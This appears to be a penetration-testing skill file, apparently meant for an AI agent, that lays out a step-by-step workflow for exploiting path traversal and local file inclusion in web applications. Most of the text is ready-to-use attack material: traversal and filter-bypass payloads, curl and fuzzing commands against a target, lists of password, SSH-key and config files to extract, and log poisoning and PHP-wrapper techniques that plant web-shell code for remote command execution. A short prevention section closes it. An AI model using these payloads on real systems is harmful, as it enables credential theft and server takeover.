---
name: file-path-traversal
description: "Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# File Path Traversal Testing

## Purpose

Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. This vulnerability occurs when user-controllable input is passed to filesystem APIs without proper validation.

## Prerequisites

### Required Tools
- Web browser with developer tools
- Burp Suite or OWASP ZAP
- cURL for testing payloads
- Wordlists for automation
- ffuf or wfuzz for fuzzing

### Required Knowledge
- HTTP request/response structure
- Linux and Windows filesystem layout
- Web application architecture
- Basic understanding of file APIs

## Outputs and Deliverables

1. **Vulnerability Report** - Identified traversal points and severity
2. **Exploitation Proof** - Extracted file contents
3. **Impact Assessment** - Accessible files and data exposure
4. **Remediation Guidance** - Secure coding recommendations

## Core Workflow

### Phase 1: Understanding Path Traversal

Path traversal occurs when applications use user input to construct file paths:

```php
// Vulnerable PHP code example
$template = "blue.php";
if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
    $template = $_COOKIE['template'];
}
include("/home/user/templates/" . $template);
```

Attack principle:
- `../` sequence moves up one directory
- Chain multiple sequences to reach root
- Access files outside intended directory

Impact:
- **Confidentiality** - Read sensitive files
- **Integrity** - Write/modify files (in some cases)
- **Availability** - Delete files (in some cases)
- **Code Execution** - If combined with file upload or log poisoning

### Phase 2: Identifying Traversal Points

Map application for potential file operations:

```bash
# Parameters that often handle files
?file=
?path=
?page=
?template=
?filename=
?doc=
?document=
?folder=
?dir=
?include=
?src=
?source=
?content=
?view=
?download=
?load=
?read=
?retrieve=
```

Common vulnerable functionality:
- Image loading: `/image?filename=23.jpg`
- Template selection: `?template=blue.php`
- File downloads: `/download?file=report.pdf`
- Document viewers: `/view?doc=manual.pdf`
- Include mechanisms: `?page=about`

### Phase 3: Basic Exploitation Techniques

#### Simple Path Traversal

```bash
# Basic Linux traversal
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Windows traversal
..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts

# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding

# Test payloads with curl
curl "http://target.com/image?filename=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/passwd"
```

#### Absolute Path Injection

```bash
# Direct absolute path (Linux)
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ

# Direct absolute path (Windows)
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
```

### Phase 4: Bypass Techniques

#### Bypass Stripped Traversal Sequences

```bash
# When ../ is stripped once
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# Nested traversal
..././..././..././etc/passwd
....//....//etc/passwd

# Mixed encoding
..%2f..%2f..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Bypass Extension Validation

```bash
# Null byte injection (older PHP versions)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Path truncation
../../../etc/passwd...............................

# Double extension
../../../etc/passwd.jpg.php
```

#### Bypass Base Directory Validation

```bash
# When path must start with expected directory
/var/www/images/../../../etc/passwd

# Expected path followed by traversal
images/../../../etc/passwd
```

#### Bypass Blacklist Filters

```bash
# Unicode/UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd

# Overlong UTF-8 encoding
%c0%2e%c0%2e%c0%af

# URL encoding variations
%2e%2e/
%2e%2e%5c
..%5c
..%255c

# Case variations (Windows)
....\\....\\etc\\passwd
```

### Phase 5: Linux Target Files

High-value files to target:

```bash
# System files
/etc/passwd           # User accounts
/etc/shadow           # Password hashes (root only)
/etc/group            # Group information
/etc/hosts            # Host mappings
/etc/hostname         # System hostname
/etc/issue            # System banner

# SSH files
/root/.ssh/id_rsa           # Root private key
/root/.ssh/authorized_keys  # Authorized keys
/home/<user>/.ssh/id_rsa    # User private keys
/etc/ssh/sshd_config        # SSH configuration

# Web server files
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/apache2/sites-enabled/000-default.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log

# Application files
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/var/www/html/web.config

# Process information
/proc/self/environ      # Environment variables
/proc/self/cmdline      # Process command line
/proc/self/fd/0         # File descriptors
/proc/version           # Kernel version

# Common application configs
/etc/mysql/my.cnf
/etc/postgresql/*/postgresql.conf
/opt/lampp/etc/httpd.conf
```

### Phase 6: Windows Target Files

Windows-specific targets:

```bash
# System files
C:\windows\win.ini
C:\windows\system.ini
C:\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\SAM
C:\windows\repair\SAM

# IIS files
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\

# Configuration files
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\passwords.txt
C:\xampp\phpmyadmin\config.inc.php

# User files
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\Desktop\
C:\Documents and Settings\<user>\
```

### Phase 7: Automated Testing

#### Using Burp Suite

```
1. Capture request with file parameter
2. Send to Intruder
3. Mark file parameter value as payload position
4. Load path traversal wordlist
5. Start attack
6. Filter responses by size/content for success
```

#### Using ffuf

```bash
# Basic traversal fuzzing
ffuf -u "http://target.com/image?filename=FUZZ" \
     -w /usr/share/wordlists/traversal.txt \
     -mc 200

# Fuzzing with encoding
ffuf -u "http://target.com/page?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -mc 200,500 -ac
```

#### Using wfuzz

```bash
# Traverse to /etc/passwd
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
      --hc 404 \
      "http://target.com/index.php?file=FUZZ"

# With headers/cookies
wfuzz -c -z file,traversal.txt \
      -H "Cookie: session=abc123" \
      "http://target.com/load?path=FUZZ"
```

### Phase 8: LFI to RCE Escalation

#### Log Poisoning

```bash
# Inject PHP code into logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Include Apache log file
curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# Include auth.log (SSH)
# First: ssh '<?php system($_GET["cmd"]); ?>'@target.com
curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
```

#### Proc/self/environ

```bash
# Inject via User-Agent
curl -A "<?php system('id'); ?>" \
     "http://target.com/page?file=/proc/self/environ"

# With command parameter
curl -A "<?php system(\$_GET['c']); ?>" \
     "http://target.com/page?file=/proc/self/environ&c=whoami"
```

#### PHP Wrapper Exploitation

```bash
# php://filter - Read source code as base64
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# php://input - Execute POST data as PHP
curl -X POST -d "<?php system('id'); ?>" \
     "http://target.com/page?file=php://input"

# data:// - Execute inline PHP
curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"

# expect:// - Execute system commands
curl "http://target.com/page?file=expect://id"
```

### Phase 9: Testing Methodology

Structured testing approach:

```bash
# Step 1: Identify potential parameters
# Look for file-related functionality

# Step 2: Test basic traversal
../../../etc/passwd

# Step 3: Test encoding variations
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Step 4: Test bypass techniques
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# Step 5: Test absolute paths
/etc/passwd

# Step 6: Test with null bytes (legacy)
../../../etc/passwd%00.jpg

# Step 7: Attempt wrapper exploitation
php://filter/convert.base64-encode/resource=index.php

# Step 8: Attempt log poisoning for RCE
```

### Phase 10: Prevention Measures

Secure coding practices:

```php
// PHP: Use basename() to strip paths
$filename = basename($_GET['file']);
$path = "/var/www/files/" . $filename;

// PHP: Validate against whitelist
$allowed = ['report.pdf', 'manual.pdf', 'guide.pdf'];
if (in_array($_GET['file'], $allowed)) {
    include("/var/www/files/" . $_GET['file']);
}

// PHP: Canonicalize and verify base path
$base = "/var/www/files/";
$realBase = realpath($base);
$userPath = $base . $_GET['file'];
$realUserPath = realpath($userPath);

if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
    include($realUserPath);
}
```

```python
# Python: Use os.path.realpath() and validate
import os

def safe_file_access(base_dir, filename):
    # Resolve to absolute path
    base = os.path.realpath(base_dir)
    file_path = os.path.realpath(os.path.join(base, filename))
    
    # Verify file is within base directory
    if file_path.startswith(base):
        return open(file_path, 'r').read()
    else:
        raise Exception("Access denied")
```

## Quick Reference

### Common Payloads

| Payload | Target |
|---------|--------|
| `../../../etc/passwd` | Linux password file |
| `..\..\..\..\windows\win.ini` | Windows INI file |
| `....//....//....//etc/passwd` | Bypass simple filter |
| `/etc/passwd` | Absolute path |
| `php://filter/convert.base64-encode/resource=config.php` | Source code |

### Target Files

| OS | File | Purpose |
|----|------|---------|
| Linux | `/etc/passwd` | User accounts |
| Linux | `/etc/shadow` | Password hashes |
| Linux | `/proc/self/environ` | Environment vars |
| Windows | `C:\windows\win.ini` | System config |
| Windows | `C:\boot.ini` | Boot config |
| Web | `wp-config.php` | WordPress DB creds |

### Encoding Variants

| Type | Example |
|------|---------|
| URL Encoding | `%2e%2e%2f` = `../` |
| Double Encoding | `%252e%252e%252f` = `../` |
| Unicode | `%c0%af` = `/` |
| Null Byte | `%00` |

## Constraints and Limitations

### Permission Restrictions
- Cannot read files application user cannot access
- Shadow file requires root privileges
- Many files have restrictive permissions

### Application Restrictions
- Extension validation may limit file types
- Base path validation may restrict scope
- WAF may block common payloads

### Testing Considerations
- Respect authorized scope
- Avoid accessing genuinely sensitive data
- Document all successful access

## Troubleshooting

| Problem | Solutions |
|---------|-----------|
| No response difference | Try encoding, blind traversal, different files |
| Payload blocked | Use encoding variants, nested sequences, case variations |
| Cannot escalate to RCE | Check logs, PHP wrappers, file upload, session poisoning |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
